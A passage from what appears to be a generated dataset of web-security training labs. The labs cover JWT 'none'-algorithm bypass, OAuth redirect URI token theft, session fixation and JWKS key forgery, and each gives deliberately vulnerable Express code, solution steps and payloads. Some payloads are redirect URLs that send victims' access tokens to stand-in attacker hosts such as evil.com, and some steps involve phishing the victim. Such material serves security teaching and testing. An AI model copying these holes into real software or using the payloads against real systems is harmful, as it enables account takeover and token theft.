  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = [{ username: 'carlos', password: 'jwtpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') return res.json({ profile: 'Carlos profile data' }); jwt.verify(token, secret); return res.json({ profile: 'Authenticated profile' }); } catch { return res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"carlos\" }",
    "JWT (Unsigned): base64(header).base64(payload).",
    "Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "OAuth Implicit Flow Misconfiguration in SOAP API",
  "Lab Description": "The app uses an OAuth implicit flow but fails to validate the `aud` (audience) parameter. Attackers can supply their own token intended for a different client ID to gain access. To solve: Forge an access token using a public OAuth tool and access the SOAP profile service.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1.Use a tool like Postman to initiate an OAuth implicit flow with a public redirect URI.",
    "2.Intercept the access_token returned in the URI fragment. Decode it and observe the `aud` claim allows any string.",
    "3.Replace the token with one containing { \"sub\": \"carlos\", \"aud\": \"evil-client\" }.",
    "4.Send a SOAP request to /soap/profile with Authorization: Bearer <forged_token>.",
    "5.Verify access to Carlos’s profile data and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(xmlparser()); app.use(bodyParser.json()); app.post('/soap/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token); if (decoded.sub === 'carlos') return res.send(`<Profile><Name>Carlos</Name><Role>Admin</Role></Profile>`); } catch { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on port 4000'));",
  "payloads": [
    "Authorization: Bearer eyJhbGciOiJI... (JWT with sub: 'carlos', aud: 'evil-client')",
    "SOAP Body: <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><getProfile/></soapenv:Body></soapenv:Envelope>"
  ]
},
{
  "Lab scenario": "Session fixation vulnerability in login response headers",
  "Lab Description": "The application issues a session identifier before login and does not regenerate it upon successful authentication. The session ID remains constant, allowing fixation attacks. The application stores sessions using cookies. To solve: hijack Carlos's session by fixing a known session ID and using it after they log in.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Using Burp Suite, visit the login page and observe the Set-Cookie header assigning a session ID before authentication.",
    "2.Send a GET /login request and capture the session ID from the Set-Cookie header.",
    "3.Share this session ID with Carlos and wait until they log in using the fixed session.",
    "4.Once Carlos is logged in, reuse the same session ID in your browser using an interceptor or session editor extension.",
    "5.Access /my-account to verify the session hijack was successful."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'secure123' }]; app.use((req, res, next) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sessionid', sid); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid].authenticated = true; sessions[sid].user = username; res.send('Welcome back!'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.authenticated) { res.send('Account for ' + sessions[sid].user); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab on http://localhost:' + PORT));",
  "payloads": [
    "Reuse pre-login session cookie after victim authenticates",
    "Manually inject sessionid cookie into browser post-login",
    "Use Burp Cookie Editor to set fixed sessionid"
  ]
},
{
  "Lab scenario": "JWT tampering vulnerability in token verification logic",
  "Lab Description": "The application uses JWTs for session management but fails to validate the algorithm correctly. It accepts tokens signed with 'none' algorithm, trusting their content without signature verification. To solve: craft a forged token granting admin access using alg=none and access Carlos's account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Capture a valid JWT issued after login using Burp Suite Proxy.",
    "2.Decode the token using jwt.io or Burp Decoder and observe the 'alg' field is RS256.",
    "3.Create a new token with header {\"alg\":\"none\"} and payload {\"username\":\"carlos\",\"role\":\"admin\"}.",
    "4.Remove the signature part completely.",
    "5.Replace the Authorization header with the new forged token using Burp Repeater or Postman.",
    "6.Send the request to /my-account and verify admin access to Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'secure123') { const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'RS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username === 'carlos') return res.send('Accessing Carlos account as ' + payload.role); return res.status(403).send('Forbidden'); } jwt.verify(token, secret, (err, payload) => { if (err) return res.status(403).send('Forbidden'); res.send('Accessing ' + payload.username + '\'s account'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Bypass Lab on http://localhost:' + PORT));",
  "payloads": [
    "JWT with alg: none and payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
    "Remove JWT signature and inject forged token via Authorization header",
    "Use jwt.io to craft unsigned token and insert manually"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in implicit grant redirect",
  "Lab Description": "The application uses OAuth 2.0 for third-party authentication but accepts arbitrary redirect URIs without validation. Attackers can hijack tokens using a crafted malicious redirect. To solve: intercept Carlos’s OAuth token using a poisoned redirect URI.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Open the login URL that triggers the OAuth flow: /auth?provider=oauth&redirect_uri=https://your-site.com/callback.",
    "2.Intercept the request in Burp and change the redirect_uri to your exploit server URL.",
    "3.Send the request. The authorization code/token will be sent to your exploit server as part of the URI fragment.",
    "4.Copy the access_token from the received request URI.",
    "5.Use Postman to send an authenticated request to /my-account using the stolen Bearer token.",
    "6.Verify successful access to Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const qs = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; // No validation! const token = 'access_token_carlos'; const fragment = qs.stringify({ access_token: token, token_type: 'bearer' }); res.redirect(`${redirect_uri}#${fragment}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer access_token_carlos') res.send('Access to Carlos account'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfig Lab running at http://localhost:' + PORT));",
  "payloads": [
    "Change redirect_uri to your exploit server in OAuth GET request",
    "Capture access_token from URI fragment on exploit server",
    "Use Bearer access_token_carlos to access /my-account"
  ]
},
{
  "Lab scenario": "Session Fixation via Cookie Injection in REST API",
  "Lab Description": "This lab demonstrates a session fixation vulnerability in a RESTful login system. The backend accepts user-supplied session tokens without regenerating them after authentication. The application reflects session tokens provided in requests, and fails to assign a new one on login. To solve: fixate Carlos’s session, then access his account using the pre-established session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept a POST /login request and observe that the server reflects the session cookie in the response.",
    "Send a crafted request using Burp Repeater with a known session ID, such as `X-Session-ID: fixed123`, before login.",
    "Observe that after login, the server accepts the supplied session ID and uses it for authenticated state.",
    "Have the victim (Carlos) log in with a fixated session by tricking them to reuse the injected session ID (e.g., through an email link).",
    "Use the same session ID to access GET /account-details with `X-Session-ID: fixed123` and confirm access to Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'secret123' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.headers['x-session-id'] || Math.random().toString(36).substring(2); const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid credentials'); sessions[sessionId] = username; res.setHeader('Set-Cookie', 'X-Session-ID=' + sessionId); res.send({ message: 'Logged in' }); }); app.get('/account-details', (req, res) => { const sessionId = req.headers['x-session-id']; if (!sessions[sessionId]) return res.status(401).send('Not logged in'); res.send('Account details for ' + sessions[sessionId]); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
  "payloads": [
    "X-Session-ID: fixed123",
    "POST /login { \"username\": \"carlos\", \"password\": \"secret123\" } + Header: X-Session-ID: fixed123",
    "GET /account-details + Header: X-Session-ID: fixed123"
  ]
},
{
  "Lab scenario": "JWT None Algorithm Tampering in GraphQL API",
  "Lab Description": "This lab exposes a JWT tampering flaw via the 'none' algorithm in a GraphQL-based authentication endpoint. The JWT is accepted without signature verification when alg=none is used. To solve: Forge a JWT token as 'admin' and access the sensitive adminGraph endpoint.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to login and inspect the Authorization: Bearer token used in GraphQL requests.",
    "Decode the JWT using jwt.io and observe it uses RS256 algorithm.",
    "Craft a new token with `\"alg\": \"none\"` and change `\"username\": \"admin\"`.",
    "Remove the JWT signature section (third part of the token) and send this forged token in Authorization header.",
    "Use GraphQL introspection or replay to access `query { adminGraph { flag } }` and validate access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { adminGraph: String }`); const root = { adminGraph: (args, context) => { if (context.user !== 'admin') throw new Error('Unauthorized'); return 'FLAG-9f84bfa'; } }; app.use('/graphql', (req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; let payload; try { payload = jwt.verify(token, 'PRIVATE_KEY', { algorithms: ['RS256', 'none'] }); } catch (err) { return res.status(401).send('Invalid token'); } req.user = payload.username; next(); }, graphqlHTTP((req) => ({ schema, rootValue: root, context: { user: req.user }, graphiql: false }))); app.listen(4001, () => console.log('JWT None Lab running'));",
  "payloads": [
    "JWT header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "JWT payload: {\"username\":\"admin\"}",
    "Authorization: Bearer <base64(header)>.base64(payload).",
    "GraphQL Query: { adminGraph { flag } }"
  ]
},
{
  "Lab scenario": "OAuth Implicit Flow Token Leak via Redirect Manipulation in SOAP Endpoint",
  "Lab Description": "The application uses OAuth implicit flow and allows arbitrary redirect URIs, exposing access tokens via fragment identifiers to untrusted domains. The SOAP authentication callback endpoint reflects redirect URLs without validation. To solve: Capture Carlos's access token by crafting a malicious redirect URI.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to analyze the /oauth/callback SOAP endpoint and observe it reflects `redirect_uri` unsanitized.",
    "Craft an authorization URL with `redirect_uri=https://evil.com#access_token=...` and send it to Carlos.",
    "Host a listener on evil.com and monitor traffic.",
    "When Carlos clicks the link and logs in, the access_token is leaked via the fragment to the attacker domain.",
    "Replay the token in Authorization: Bearer to access protected resources as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const soap = require('soap'); const app = express(); app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const accessToken = 'token-for-carlos'; res.send(`<script>window.location='${redirectUri}#access_token=${accessToken}'</script>`); }); app.listen(4002, () => console.log('OAuth Redirect Lab running'));",
  "payloads": [
    "https://vulnerable-site.com/oauth/authorize?client_id=xyz&response_type=token&redirect_uri=https://evil.com",
    "Leaked URL: https://evil.com#access_token=token-for-carlos",
    "Authorization: Bearer token-for-carlos"
  ]
},
{
  "Lab scenario": "Session Fixation via Reused Auth Token in SOAP API",
  "Lab Description": "The application's SOAP-based login system fails to issue new session identifiers upon re-authentication. The application retains the initial session ID for subsequent logins. To solve: exploit session fixation to gain access to the victim's session by tricking them into logging in with a fixed session identifier.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept SOAP request with Burp Suite and capture the session cookie assigned on initial request.",
    "Observe the response structure and note that the session cookie remains unchanged across logins.",
    "Craft a SOAP login payload with victim credentials and replay it while maintaining the same session cookie.",
    "Send phishing link or script to the victim embedding the fixed session cookie in a browser session.",
    "After victim logs in, reuse the fixed session cookie to access their authenticated session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.text({ type: 'application/soap+xml' })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/soap-auth', (req, res) => { const sessionId = req.cookies.sessionid || Math.random().toString(36).substring(2); const creds = req.body.match(/<username>(.*?)<\\/username>.*?<password>(.*?)<\\/password>/); const [_, username, password] = creds; const user = users.find(u => u.username === username && u.password === password); if (user) { res.setHeader('Set-Cookie', `sessionid=${sessionId}; HttpOnly`); res.send(`<response><message>Login successful</message></response>`); } else { res.status(403).send(`<response><message>Unauthorized</message></response>`); } }); app.get('/my-account', (req, res) => { if (req.cookies.sessionid === 'fixsession123') return res.send('Account: carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "<soap><username>carlos</username><password>letmein</password></soap>",
    "Set-Cookie: sessionid=fixsession123",
    "GET /my-account with sessionid=fixsession123"
  ]
},
{
  "Lab scenario": "JWT Signature Confusion in Authorization Header",
  "Lab Description": "The application uses a JWKS endpoint to validate JWTs but does not validate the 'kid' field properly. This allows attackers to supply a custom public key and forge tokens. To solve: forge an admin token by injecting a manipulated 'kid' field and supplying your own matching public key.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to inspect JWT in the Authorization header and extract its structure.",
    "Send a forged token with a 'kid' referencing a custom key you control, using Burp Repeater.",
    "Host a malicious JWKS endpoint serving your public key under the specified 'kid'.",
    "Modify the payload to escalate privileges to admin and re-sign the token.",
    "Use the forged JWT to access the admin-only endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const jwksClient = require('jwks-rsa'); const app = express(); const client = jwksClient({ jwksUri: 'http://localhost:4001/.well-known/jwks.json' }); const getKey = (header, callback) => { client.getSigningKey(header.kid, (err, key) => { if (err) return callback(err); const signingKey = key.getPublicKey(); callback(null, signingKey); }); }; app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; jwt.verify(token, getKey, {}, (err, decoded) => { if (err || decoded.role !== 'admin') return res.status(403).send('Access Denied'); res.send('Welcome, admin!'); }); }); app.listen(4000, () => console.log('JWT Signature Confusion Lab running on http://localhost:4000'));",
  "payloads": [
    "{ \"alg\": \"RS256\", \"kid\": \"maliciousKey1\" }",
    "{ \"username\": \"carlos\", \"role\": \"admin\" }",
    "Signed token with RS256 using attacker's private key",
    "GET /admin with Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration via Open Redirect in Redirect URI",
  "Lab Description": "The application allows arbitrary redirect URIs after OAuth login. This misconfiguration can be abused to steal access tokens. To solve: capture a valid access token for the victim by injecting a malicious redirect_uri that sends the token to your server.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Using OWASP ZAP, intercept the OAuth flow and analyze the redirect_uri behavior.",
    "Test redirect_uri with an external domain (your controlled endpoint) to confirm open redirect is allowed.",
    "Construct an OAuth authorization URL with redirect_uri pointing to your malicious endpoint.",
    "Send phishing link containing the crafted URL to the victim to trick them into authenticating.",
    "Intercept the redirect and capture the access token sent in the URL fragment or query string."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const clients = [{ client_id: 'app123', redirect_uri: 'ANY' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; const client = clients.find(c => c.client_id === client_id); if (!client) return res.status(403).send('Invalid client'); const token = 'access-token-carlos'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
  "payloads": [
    "http://localhost:4000/oauth/authorize?client_id=app123&redirect_uri=https://attacker.com/steal-token",
    "https://attacker.com/steal-token?access_token=access-token-carlos"
  ]
},
{
  "Lab scenario": "Session Fixation in REST API login flow",
  "Lab Description": "This lab's session management is vulnerable to session fixation through insecure handling of session cookies during login. The application sets a session cookie before authentication and reuses it post-login without regeneration. To solve: Fixate a session ID and force Carlos to authenticate using the attacker-defined session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Using Burp Suite, intercept a GET /login request and observe that a session cookie is set pre-authentication.",
    "2.Send the GET /login request to Burp Repeater and note the issued session ID.",
    "3.Force this session ID to be used by Carlos: trick him via CSRF or send a crafted link (simulate using /simulate-carlos-login endpoint with your cookie).",
    "4.Log in as Carlos using valid credentials (already known or via enumeration).",
    "5.Reuse the attacker-controlled session cookie to access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'vulnerablesecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'supersecret' }]; app.get('/login', (req, res) => { res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = user.username; res.send('Welcome!'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') res.send('Account page of Carlos'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Reuse pre-login session cookie after Carlos authenticates",
    "Force victim to use attacker session ID: /simulate-carlos-login?cookie=sessionID",
    "Access /my-account with fixed session"
  ]
},
{
  "Lab scenario": "JWT tampering via alg=none in GraphQL authentication",
  "Lab Description": "The GraphQL login endpoint returns a JWT that is improperly validated. The server does not enforce signature verification when the alg field is set to 'none'. To solve: Modify a valid JWT to impersonate Carlos by removing the signature and setting alg to none.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use Postman to log in as a regular user and capture the JWT from the Authorization header.",
    "2.Decode the JWT using jwt.io or Burp Decoder. Observe the HS256 alg and payload structure.",
    "3.Modify the header to {\"alg\":\"none\"} and the payload to {\"username\":\"carlos\"}. Remove the signature section.",
    "4.Send a request to the GraphQL endpoint using the tampered token: POST /graphql with Authorization: Bearer <modified_token>.",
    "5.Query the account details with: { me { username email } } and verify access as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtflaw' }]; const schema = buildSchema(` type Query { me: User } type User { username: String, email: String } `); const root = { me: (args, context) => { return { username: context.user.username, email: context.user.username + '@example.com' }; } }; app.use('/graphql', (req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (token) { try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; } else { req.user = jwt.verify(token, 'secret'); } } catch (e) { return res.status(403).send('Invalid token'); } } else { return res.status(401).send('Missing token'); } next(); }, graphqlHTTP((req) => ({ schema, rootValue: root, context: { user: req.user }, graphiql: true }))); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}",
    "Remove signature section of JWT",
    "POST /graphql with Authorization: Bearer <modified_token>",
    "{ me { username email } }"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in redirect URI validation",
  "Lab Description": "The application implements OAuth implicit flow but fails to strictly validate redirect URIs. An attacker can hijack tokens by manipulating the redirect URI to point to a domain they control. To solve: Capture the access token issued for Carlos by hijacking the redirect.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use OWASP ZAP to proxy the OAuth flow: initiate login and capture the authorization request to /authorize.",
    "2.Observe the redirect_uri parameter. Note that the app allows any subdomain of attacker-site.com.",
    "3.Craft a malicious redirect_uri like https://evil.attacker-site.com/callback and initiate the auth request with carlos logged in.",
    "4.Trigger the OAuth flow (simulate if needed via /simulate-oauth?user=carlos) and capture the redirected request on evil.attacker-site.com.",
    "5.Extract the access_token from the URI fragment and use it in Authorization header: GET /my-account with Bearer token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const oauthTokens = {}; const clients = [{ client_id: 'abc123', redirect_uri: 'https://*.attacker-site.com/callback' }]; const users = [{ username: 'carlos' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type, state } = req.query; const client = clients.find(c => c.client_id === client_id); if (!client || !redirect_uri.includes('.attacker-site.com')) return res.status(400).send('Invalid redirect URI'); const token = Buffer.from('carlos:' + Date.now()).toString('base64'); oauthTokens[token] = 'carlos'; res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (oauthTokens[token] === 'carlos') res.send('Carlos account accessed'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Hijack Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Redirect URI: https://evil.attacker-site.com/callback",
    "Access token from URI fragment: #access_token=...",
    "Authorization: Bearer <token>",
    "GET /my-account"
  ]
},
{
  "Lab scenario": "Session Fixation in SOAP API login flow",
  "Lab Description": "This lab demonstrates session fixation via SOAP-based authentication. The application reuses an existing session ID after login instead of generating a new one. This allows attackers to fix a session ID before victim login. The SOAP API accepts session tokens via HTTP headers, and the server provides overly verbose XML errors on failed authentication. To solve: fix a session ID, force the victim to authenticate into it, and access their profile page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to observe the SOAP login request: POST /soap-auth with SOAPAction header and XML body.",
    "2. Send an unauthenticated request to /profile. Capture the Set-Cookie header with JSESSIONID.",
    "3. Fixate the session ID by injecting the JSESSIONID into the victim’s browser using a CSRF bait page or reflected XSS endpoint.",
    "4. After the victim logs in using the SOAP login endpoint, reuse the same JSESSIONID in your session.",
    "5. Access /profile with the fixed JSESSIONID. If you see the victim’s account data, the lab is solved."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const soap = require('soap'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'soapSecret', resave: false, saveUninitialized: true })); app.use(bodyParser.text({ type: 'text/xml' })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/soap-auth', (req, res) => { const xml = req.body; const creds = parseSOAP(xml); const user = users.find(u => u.username === creds.username && u.password === creds.password); if (!user) return res.status(500).send(`<SOAP-ENV:Fault><faultstring>Invalid credentials for ${creds.username}</faultstring></SOAP-ENV:Fault>`); req.session.user = user.username; res.send(`<SOAP-ENV:Envelope><Body><status>Login successful</status></Body></SOAP-ENV:Envelope>`); }); app.get('/profile', (req, res) => { if (!req.session.user) return res.status(403).send('Unauthorized'); res.send(`Profile for ${req.session.user}`); }); function parseSOAP(xml) { const username = xml.match(/<username>(.*?)<\\/username>/)[1]; const password = xml.match(/<password>(.*?)<\\/password>/)[1]; return { username, password }; } const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation SOAP Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "<soapenv:Envelope><Body><username>carlos</username><password>pass123</password></Body></soapenv:Envelope>",
    "Cookie: JSESSIONID=FIXEDSESSIONID123",
    "XML Injection via malformed username fields (testing debug logs)"
  ]
},
{
  "Lab scenario": "JWT Authentication Bypass via 'none' algorithm in REST API",
  "Lab Description": "The lab uses JWTs for REST API authentication but does not properly verify the token signature algorithm. The server accepts tokens with 'alg':'none' and does not enforce a secret check. To solve: forge a JWT with 'none' algorithm to impersonate Carlos and access the /api/userinfo endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman to log in and inspect the JWT token returned in Authorization: Bearer <token> format.",
    "2. Decode the JWT in jwt.io and analyze the header. Note that it uses HS256.",
    "3. Craft a JWT with header {'alg':'none'} and payload {'username':'carlos'} with no signature.",
    "4. Send a GET /api/userinfo request with Authorization: Bearer <forged-token>.",
    "5. If the response returns Carlos’s user info, the lab is solved."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; const users = [{ username: 'carlos', password: 'carlospass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') return res.json({ user: decoded.payload.username }); try { const verified = jwt.verify(token, secret); res.json({ user: verified.username }); } catch { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running at http://localhost:${PORT}`));",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"username\":\"carlos\"}",
    "JWT: base64UrlEncode(header).base64UrlEncode(payload)."
  ]
},
{
  "Lab scenario": "OAuth Code Interception in GraphQL Login Flow",
  "Lab Description": "The application implements login via OAuth in a GraphQL mutation using the authorization code grant. However, the client doesn't bind the authorization code to the session. An attacker can intercept the code and redeem it on their session to hijack the victim's login. To solve: intercept Carlos's OAuth code and redeem it via GraphQL to impersonate him.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Use OWASP ZAP to proxy traffic and inspect the GraphQL mutation flow after initiating OAuth login.",
    "2. Observe the OAuth redirect URL leaking the authorization code in the query string.",
    "3. Simulate interception by copying Carlos’s code parameter and replaying it in your own GraphQL login mutation.",
    "4. Send the GraphQL mutation loginWithOAuth(code: \"<intercepted>\")",
    "5. If your session is authenticated as Carlos, navigate to /me to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', oauth_id: 'oauth123' }]; app.use(bodyParser.json()); app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('loginWithOAuth')) { const code = query.match(/code: \\\"(.*?)\\\"/)[1]; const user = users.find(u => u.oauth_id === code); if (!user) return res.status(403).json({ error: 'Invalid code' }); const sessionId = 'sess_' + Math.random().toString(36).slice(2); sessions[sessionId] = user.username; res.json({ token: sessionId }); } }); app.get('/me', (req, res) => { const token = req.headers['authorization']; const username = sessions[token]; if (!username) return res.status(401).send('Unauthorized'); res.send(`Welcome ${username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth GraphQL Lab running at http://localhost:${PORT}`));",
  "payloads": [
    "loginWithOAuth(code: \"oauth123\")",
    "Replay intercepted code in GraphQL mutation: { mutation { loginWithOAuth(code: \"oauth123\") } }",
    "Authorization: sess_<generated_session>"
  ]
},
{
  "Lab scenario": "Session fixation in SOAP login handler",
  "Lab Description": "The application's SOAP-based login mechanism does not regenerate session tokens after authentication. The application accepts externally provided session tokens via a JSESSIONID cookie. This allows an attacker to fixate a session ID for a victim prior to authentication. To solve: fixate a session and hijack Carlos's authenticated session using a shared SOAP login channel.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to proxy and observe the SOAP login endpoint and session cookies.",
    "Send an unauthenticated SOAP request to generate a session, and copy the issued JSESSIONID.",
    "Send a crafted phishing link to Carlos embedding the fixed JSESSIONID in a cookie.",
    "Once Carlos logs in, reuse the same session ID to access the authenticated state.",
    "Verify by navigating to /my-account and confirming access to Carlos's data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const soap = require('soap'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'soapsecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carlos123' }]; app.post('/soap-login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.send(`<soap:Envelope><soap:Body><loginResponse>Success</loginResponse></soap:Body></soap:Envelope>`); } else { res.status(403).send(`<soap:Envelope><soap:Body><loginResponse>Failure</loginResponse></soap:Body></soap:Envelope>`); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account data for ${req.session.user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
  "payloads": [
    "Set-Cookie: JSESSIONID=attackerSession123;",
    "SOAP POST with <username>carlos</username> and <password>carlos123</password> using fixed JSESSIONID",
    "GET /my-account with Cookie: JSESSIONID=attackerSession123"
